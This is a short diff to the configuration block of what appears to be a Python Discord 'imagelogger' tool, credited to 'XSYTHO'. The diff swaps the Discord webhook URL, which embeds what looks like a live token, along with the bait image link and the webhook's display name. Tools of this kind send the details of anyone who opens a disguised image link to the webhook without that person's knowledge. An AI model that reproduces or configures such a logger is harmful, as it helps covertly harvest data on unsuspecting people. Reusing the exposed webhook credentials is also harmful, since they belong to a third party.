@@ -13,13 +13,13 @@ __author__ = "XSYTHO"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1357200946278694933/H9lG-x2c97P9U8zoSZk5x4yRefrmKSAlXcJcPNyIRJUPWuhm5LtkNLoOlQQK8NTl4Whi",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.pinterest.com%2Fpin%2F1041879695039745727%2F&psig=AOvVaw2e46YzJRNNVEMCvltgihPk&ust=1743738824264000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCJCl19f7uowDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1357230392507240469/4XskV-5LnfH478Iu7i4U8Egvig150SZ-wX0CtGk1PdqJhkxlFD4pFYgyZWSPrVzo-7YX",
+    "image": "https://cdn.discordapp.com/attachments/1320682733718208536/1356977624567648427/SPOILER_received_1162064399000857.png?ex=67ef3025&is=67eddea5&hm=2e463ed6efe9f55135dce4864f87361ba0f417f77c87a22863c4e0a8cfbcb134&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "KUPAL", # Set this to the name you want the webhook to have
+    "username": "STAN", # Set this to the name you want the webhook to have
     "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
